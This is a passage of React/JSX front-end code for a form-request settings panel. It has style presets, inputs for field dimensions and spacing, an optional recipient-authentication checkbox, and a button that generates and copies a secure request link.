              Input Field Dimensions & Spacing
            </label>
            
            {/* Style Presets */}
            <div className="mb-4">
              <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-3">
                Quick Presets
              </label>
              <div className="grid grid-cols-4 gap-2">
                <button
                  type="button"
                  onClick={() => applyStylePreset('compact')}
                  className={`px-4 py-3 rounded-lg border-2 text-sm font-medium transition-all ${
                    stylePreset === 'compact'
                      ? 'border-purple-500 bg-purple-50 dark:bg-purple-900/20 text-purple-700 dark:text-purple-300'
                      : 'border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700 text-gray-700 dark:text-gray-300 hover:border-purple-400'
                  }`}
                >
                  Compact
                </button>
                <button
                  type="button"
                  onClick={() => applyStylePreset('default')}
                  className={`px-4 py-3 rounded-lg border-2 text-sm font-medium transition-all ${
                    stylePreset === 'default'
                      ? 'border-purple-500 bg-purple-50 dark:bg-purple-900/20 text-purple-700 dark:text-purple-300'
                      : 'border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700 text-gray-700 dark:text-gray-300 hover:border-purple-400'
                  }`}
                >
                  Default
                </button>
                <button
                  type="button"
                  onClick={() => applyStylePreset('spacious')}
                  className={`px-4 py-3 rounded-lg border-2 text-sm font-medium transition-all ${
                    stylePreset === 'spacious'
                      ? 'border-purple-500 bg-purple-50 dark:bg-purple-900/20 text-purple-700 dark:text-purple-300'
                      : 'border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700 text-gray-700 dark:text-gray-300 hover:border-purple-400'
                  }`}
                >
                  Spacious
                </button>
                <button
                  type="button"
                  onClick={() => applyStylePreset('minimal')}
                  className={`px-4 py-3 rounded-lg border-2 text-sm font-medium transition-all ${
                    stylePreset === 'minimal'
                      ? 'border-purple-500 bg-purple-50 dark:bg-purple-900/20 text-purple-700 dark:text-purple-300'
                      : 'border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700 text-gray-700 dark:text-gray-300 hover:border-purple-400'
                  }`}
                >
                  Minimal
                </button>
              </div>
            </div>

            {/* Custom Controls */}
            <div className="space-y-4 pt-4 border-t border-gray-200 dark:border-slate-700">
              <p className="text-xs text-gray-500 dark:text-gray-400 mb-3">
                Fine-tune individual properties (overrides preset)
              </p>
              
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Input Height
                  </label>
                  <input
                    type="text"
                    value={inputHeight}
                    onChange={(e) => {
                      setInputHeight(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="56px"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Input Padding
                  </label>
                  <input
                    type="text"
                    value={inputPadding}
                    onChange={(e) => {
                      setInputPadding(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="16px 20px"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Form Gap (spacing between fields)
                  </label>
                  <input
                    type="text"
                    value={formGap}
                    onChange={(e) => {
                      setFormGap(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="24px"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Border Radius
                  </label>
                  <input
                    type="text"
                    value={inputBorderRadius}
                    onChange={(e) => {
                      setInputBorderRadius(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="16px"
                  />
                </div>
              </div>

              <div className="grid grid-cols-3 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Border Width
                  </label>
                  <input
                    type="text"
                    value={inputBorderWidth}
                    onChange={(e) => {
                      setInputBorderWidth(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="2px"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Label Margin Bottom
                  </label>
                  <input
                    type="text"
                    value={labelMarginBottom}
                    onChange={(e) => {
                      setLabelMarginBottom(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="8px"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Font Size
                  </label>
                  <input
                    type="text"
                    value={inputFontSize}
                    onChange={(e) => {
                      setInputFontSize(e.target.value)
                      setStylePreset('custom')
                    }}
                    className="w-full px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white font-mono"
                    placeholder="16px"
                  />
                </div>
              </div>
            </div>
          </div>

          <div className="p-4 bg-blue-50 dark:bg-blue-900/20 rounded-xl border border-blue-200 dark:border-blue-800">
            <label className="flex items-start cursor-pointer">
              <input
                type="checkbox"
                checked={requiresAuth}
                onChange={(e) => setRequiresAuth(e.target.checked)}
                className="mt-1 mr-3"
              />
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-1">
                  <Shield size={16} className="text-blue-600 dark:text-blue-400" />
                  <span className="text-sm font-semibold text-gray-900 dark:text-white">
                    Require recipient authentication
                  </span>
                </div>
                <p className="text-xs text-gray-600 dark:text-gray-400">
                  {requiresAuth 
                    ? "Recipients must create an account or sign in before submitting. This provides better security and audit trails."
                    : "Recipients can submit without creating an account. Less secure but more convenient for quick submissions."}
                </p>
              </div>
            </label>
          </div>

          <Button onClick={handleGenerateLink} className="w-full">
            <Sparkles size={18} className="mr-2" />
            Create Secure Request Link
          </Button>

          {generatedLink && (
            <div className="p-4 bg-green-50 dark:bg-green-900/20 rounded-xl border border-green-200 dark:border-green-800">
              <p className="text-sm font-medium text-gray-900 dark:text-white mb-2">
                ✓ Link created — expires in {expiresIn} days
              </p>
              <div className="flex items-center gap-2">
                <input 
                  value={generatedLink} 
                  readOnly 
                  className="flex-1 px-4 py-2 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg font-mono text-sm text-gray-900 dark:text-white" 
                />
                <Button onClick={handleCopy} variant="secondary" size="sm">
                  {copied ? <Check size={18} /> : <Copy size={18} />}
                </Button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

